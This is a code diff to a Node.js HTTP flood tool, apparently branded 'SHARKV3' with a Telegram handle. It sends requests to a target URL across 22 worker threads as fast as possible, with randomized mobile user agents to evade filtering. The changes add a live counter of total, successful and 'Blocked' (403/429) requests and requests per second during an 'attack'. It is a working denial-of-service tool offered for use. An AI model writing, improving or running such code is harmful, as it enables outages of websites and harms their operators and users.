@@ -2,7 +2,7 @@ const http = require('http');
 const { Worker, isMainThread, parentPort } = require('worker_threads');
 const url = require('url');
 
-// Helper function to generate random user agent
+// Helper function to generate random mobile user agent
 function generateRandomMobileUserAgent() {
     const androidModels = [
         "SM-G930F", "Nexus 5X", "Mi 11X Pro", "ASUS_X00QD", "OPPO A9 2020", "Huawei P30", 
@@ -15,7 +15,6 @@ function generateRandomMobileUserAgent() {
     const iosVersions = ["13.3", "14.0", "14.2", "12.4", "11.4"];
     const browsers = ["Chrome", "Safari", "Firefox"];
     
-    // Choose between Android and iOS
     const isAndroid = Math.random() < 0.5;
     
     let userAgent;
@@ -23,14 +22,14 @@ function generateRandomMobileUserAgent() {
         const model = androidModels[Math.floor(Math.random() * androidModels.length)];
         const version = androidVersions[Math.floor(Math.random() * androidVersions.length)];
         const browser = browsers[Math.floor(Math.random() * browsers.length)];
-        const browserVersion = (Math.random() * (100 - 50) + 50).toFixed(1); // Random browser version between 50-100
+        const browserVersion = (Math.random() * (100 - 50) + 50).toFixed(1);
 
         userAgent = `Mozilla/5.0 (Linux; Android ${version}; ${model} Build/OPM1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Mobile Safari/537.36`;
     } else {
         const model = iosModels[Math.floor(Math.random() * iosModels.length)];
         const version = iosVersions[Math.floor(Math.random() * iosVersions.length)];
         const browser = browsers[Math.floor(Math.random() * browsers.length)];
-        const browserVersion = (Math.random() * (100 - 50) + 50).toFixed(1); // Random browser version between 50-100
+        const browserVersion = (Math.random() * (100 - 50) + 50).toFixed(1);
 
         userAgent = `Mozilla/5.0 (iPhone; CPU iPhone OS ${version} like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/${browserVersion}.0 Mobile/15E148 Safari/537.36`;
     }
@@ -53,20 +52,50 @@ function sendRequests(targetUrl, durationMs) {
         'User-Agent': userAgent
     };
 
-    // Variables to track request statistics
-    let totalSent = 0;
+    let totalRequests = 0;
+    let successCount = 0;
+    let errorCount = 0;
+
+    // Function to log stats every 100ms
+    const updateStats = () => {
+        const remainingTime = durationMs - (Date.now() - startTime);
+        const minutesRemaining = Math.floor(remainingTime / 60000);
+        const secondsRemaining = Math.floor((remainingTime % 60000) / 1000);
+
+        // Overwrite the current terminal output with updated stats
+        process.stdout.write(
+            `SHARKV3 - T.ME/STSVKINGDOM\n` +
+            `===========================\n` +
+            `total: ${totalRequests}\n` +
+            `max-r: ${Math.floor(totalRequests / ((Date.now() - startTime) / 1000))}\n` + // max RPS
+            `===========================\n` +
+            `success: ${successCount}\n` +
+            `Blocked: ${errorCount}\n` +
+            `===========================\n` +
+            `TIME REMAINING: ${minutesRemaining}:${secondsRemaining < 10 ? '0' : ''}${secondsRemaining}\r`
+        );
+    };
 
     // Send requests continuously until the duration is over
     const intervalId = setInterval(() => {
         const req = http.request(requestOptions, (res) => {
-            totalSent++; // Increment total requests sent
-            // We're ignoring the response, no need to track success or errors
-            res.on('data', () => {}); // Consume response body to keep connection alive
+            totalRequests++; // Increment total requests sent
+
+            // We're not tracking success or failure, we just send and ignore responses
+            if (res.statusCode === 403 || res.statusCode === 429) {
+                errorCount++; // Count blocked requests
+            } else {
+                successCount++; // Count successful requests (status codes 2xx)
+            }
+
+            // Update the log stats
+            updateStats();
         });
 
         req.on('error', (err) => {
-            totalSent++; // Increment total requests sent even on error
-            // No need to track or log errors, just send requests
+            totalRequests++; // Increment total requests sent on error
+            errorCount++; // Count any error as a blocked request
+            updateStats();
         });
 
         req.end();
@@ -74,9 +103,9 @@ function sendRequests(targetUrl, durationMs) {
         // Stop after the specified duration
         if (Date.now() - startTime >= durationMs) {
             clearInterval(intervalId);
-            console.log(`Worker finished. Total requests sent: ${totalSent}`);
+            console.log(`\nWorker finished. Total requests sent: ${totalRequests}`);
         }
-    }, 0); // 0ms to simulate a non-stop flood of requests
+    }, 0); // 0ms to simulate sending requests as fast as possible (no delay)
 
     // To avoid endless loop in case we fail to clearInterval on time
     setTimeout(() => clearInterval(intervalId), durationMs);
@@ -94,7 +123,7 @@ if (isMainThread) {
     const durationMs = durationSecs * 1000;
     console.log(`Starting attack on ${targetUrl} for ${durationSecs} seconds with 22 threads...`);
 
-    // Spawn 22 worker threads
+    // Spawn 22 worker threads to flood the target with requests
     const workers = [];
     for (let i = 0; i < 22; i++) {
         const worker = new Worker(__filename);
